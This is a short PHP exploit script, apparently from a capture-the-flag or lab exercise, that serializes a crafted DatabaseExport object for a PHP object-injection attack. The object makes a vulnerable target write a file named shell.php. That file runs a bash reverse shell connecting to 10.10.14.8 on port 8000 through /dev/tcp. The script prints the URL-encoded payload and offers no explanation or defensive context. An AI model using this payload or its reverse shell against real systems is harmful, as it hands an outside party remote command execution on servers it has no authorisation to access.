<?php

class DatabaseExport {
  public $user_file = 'shell.php';
  public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.10.14.8/8000 0>&1\'"); ?>';
}

print urlencode(serialize(new DatabaseExport));

?>
